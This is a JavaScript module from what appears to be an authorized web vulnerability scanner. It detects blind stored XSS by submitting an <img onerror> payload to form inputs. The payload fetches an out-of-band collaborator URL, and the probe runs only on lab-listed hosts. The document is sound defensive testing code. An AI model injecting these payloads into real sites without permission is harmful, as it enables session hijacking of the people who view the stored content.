// Dark Matter rule-based scanner — blind XSS probe (coverage row #113 [High]).
//
// Stored XSS (storedXss.js) re-GETs the action page and the site root — it
// can only confirm a payload that renders where the scanner looks. Blind
// XSS fires in a DIFFERENT context than the injection point (e.g. an admin
// panel the scanner never visits), so the only confirmation is out-of-band:
// submit a canary payload that, if EXECUTED in any context, fetches a
// collaborator canary URL. A callback hit CONFIRMS blind XSS in-scan
// (class xss_blind_oob, high); no hit means no finding (100% truth rule).
//
// The payload is inert unless executed: an <img onerror> handler that
// fetches the canary URL. A bare reflection of the payload string in a
// response proves nothing — no fetch happens — so reflection alone can
// never confirm (that is #117's job). <img onerror> (not <script>) is the
// carrier because a <script> tag injected via innerHTML does not execute
// in browsers, while an event-handler attribute does — the admin-panel
// render path most often goes through innerHTML.
//
// Lab-gated exactly like the blind-XXE variant in xxe.js: the OOB leg runs
// only when opts.oobCallback is set AND the host is listed in
// opts.labTargets. When a waiter is wired (opts.oobWaitFor — runScan
// starts the in-process collaborator for lab-gated scans), a callback hit
// for our token CONFIRMS. Without a waiter (an external oobCallback
// string only) the old honest INFO record stands — dispatched,
// confirmation out-of-band. Same shape as xxe.js xxe_oob / xxe_oob_sent.
//
// The first submission must have reached the target: a transport failure
// there means the endpoint is down, and waiting up to 8s for a hit that
// cannot come would only stall the scan (xxe.js has the same precondition).
//
// Bounds: at most 3 forms x 2 inputs, one wait (default 8s) per input —
// worst case ~48s of waiting on a lab target that stores but never
// executes. Non-lab targets never receive a callback URL.
import { randomBytes } from 'node:crypto';

const UA = 'DarkMatter-Scanner/1.0 (+authorized-scan)';

function rand() {
  return randomBytes(4).toString('hex');
}

// LAB GATE: the OOB variant runs only when the authorized host is listed
// in opts.labTargets (same split pattern as xxe.js / saml.js / index.js).
function isLabHost(url, opts) {
  let host = '';
  try { host = new URL(url).host; } catch { return false; }
  return String(opts.labTargets || '')
    .split(/[,\s]+/)
    .some((t) => t && (host.includes(t) || t.includes(host)));
}

async function get(url, opts = {}) {
  const ctrl = new AbortController();
  const t = setTimeout(() => ctrl.abort(), opts.timeoutMs || 15000);
  try {
    const res = await fetch(url, {
      signal: ctrl.signal,
      headers: { 'User-Agent': UA, ...(opts.headers || {}) },
    });
    const text = await res.text().catch(() => '');
    return { status: res.status, text };
  } catch {
    return { status: 0, text: '' };
  } finally {
    clearTimeout(t);
  }
}

async function post(url, params, opts = {}) {
  const ctrl = new AbortController();
  const t = setTimeout(() => ctrl.abort(), opts.timeoutMs || 15000);
  try {
    const res = await fetch(url, {
      method: 'POST',
      signal: ctrl.signal,
      headers: {
        'User-Agent': UA,
        'Content-Type': 'application/x-www-form-urlencoded',
        ...(opts.headers || {}),
      },
      body: params.toString(),
    });
    const text = await res.text().catch(() => '');
    return { status: res.status, text };
  } catch {
    return { status: 0, text: '' };
  } finally {
    clearTimeout(t);
  }
}

function isSubmittish(name) {
  return /^(submit|button|reset|image)$/i.test(String(name || ''));
}

function fillParams(inputs, targetName, payload) {
  const params = new URLSearchParams();
  let n = 0;
  for (const inp of inputs || []) {
    if (isSubmittish(inp)) continue;
    if (inp === targetName) params.set(inp, payload);
    else params.set(inp, `dmprobe${++n}_${randomBytes(2).toString('hex')}`);
  }
  // DVWA-style forms require Submit to be set (isset gate).
  params.set('Submit', '1');
  return params;
}

export async function probeBlindXss(forms, url, opts = {}) {
  const findings = [];
  // No collaborator base, or the host is not lab-gated: the OOB leg
  // cannot run at all. There is no non-OOB leg in this probe — blind
  // XSS IS the OOB leg — so the probe returns [] here.
  if (!opts.oobCallback || !isLabHost(url, opts)) return findings;
  const base = String(opts.oobCallback).replace(/\/+$/, '');
  const hasWaiter = typeof opts.oobWaitFor === 'function';

  for (const form of (forms || []).slice(0, 3)) {
    const targets = (form.inputs || []).filter((i) => !isSubmittish(i)).slice(0, 2);
    for (const input of targets) {
      const token = `bxss-${rand()}`;
      const oobUrl = `${base}/${token}`;
      const payload = `<img src=x onerror="fetch('${oobUrl}')">`;
      const params = fillParams(form.inputs, input, payload);
      let r;
      try {
        if (String(form.method || 'get').toLowerCase() === 'post') {
          r = await post(form.action, params, opts);
        } else {
          r = await get(`${form.action}${form.action.includes('?') ? '&' : '?'}${params.toString()}`, opts);
        }
      } catch {
        continue;
      }
      // Endpoint down: never wait for a hit that cannot come.
      if (!r || r.status === 0) continue;

      if (hasWaiter) {
        const hit = await opts.oobWaitFor(token, opts.oobWaitTimeoutMs || 8000);
        if (hit) {
          findings.push({
            class: 'xss_blind_oob',
            id: `xss-blind-oob-${rand()}`,
            title: 'Blind XSS — stored payload executed out-of-band (collaborator callback)',
            severity: 'high',
            url: form.action,
            param: input,
            parameter: input, // dedup key: one finding per sink input, not per page
            evidence: {
              request: `${String(form.method || 'get').toUpperCase()} ${form.action} (${input}=<img src=x onerror="fetch('${oobUrl}')">)`,
              response: `payload submitted (status ${r.status}); collaborator received ${hit.method} ${hit.path} at ${hit.at} — the payload executed in a context the scanner never visits`,
              impact_demo: 'Blind XSS: attacker input stored and executed in another context (e.g. admin panel) — session hijack / account takeover for whoever views it',
              signalCorrelated: true,
              oobHit: true,
            },
          });
        }
      } else {
        findings.push({
          class: 'xss_blind_oob_sent',
          id: `xss-blind-oob-${rand()}`,
          title: 'Blind XSS OOB probe dispatched — confirm via collaborator',
          severity: 'info',
          url: form.action,
          param: input,
          parameter: input,
          evidence: {
            request: `${String(form.method || 'get').toUpperCase()} ${form.action} (${input}=<img src=x onerror="fetch('${oobUrl}')">)`,
            response: `payload → ${oobUrl} sent (status ${r.status}; canary URL only, no file targets); confirm out-of-band via the collaborator`,
            impact_demo: 'An OOB hit proves the stored payload executed in another context (blind XSS)',
            signalCorrelated: true,
          },
        });
      }
    }
  }
  return findings;
}
